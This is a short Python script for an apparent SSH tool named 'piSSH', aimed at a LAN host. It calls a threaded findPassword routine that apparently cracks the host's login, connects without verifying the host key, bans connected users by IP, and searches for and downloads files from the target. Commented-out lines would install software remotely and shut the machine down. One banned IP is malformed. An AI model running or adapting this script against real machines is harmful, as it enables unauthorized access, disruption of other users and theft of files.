import piSSH

selfUser = piSSH.user()
selfUser.set(ip = '192.168.1.104')
client = piSSH.client(ip = '192.168.1.101')
client.findPassword(threads = 4)
client.connecting(AutoAddPolicy = True)
#client.command(command = 'pip3 install vk', inputting = 'y')
client.getAllConnectedUsers(printInfo = True)
client.banUsers(banUsers = ['192.442.2.11','192.168.1.103'])
files = client.findFile(name = 'example', expansion = '.py')
for file in files:
    client.downloadFile(originalName = file, finalName = file, isTree = True)
    
try:
    while True:
        pass
except:
    #client.shutdown()
    client.close()
    print('CTRL + C pressed')
   

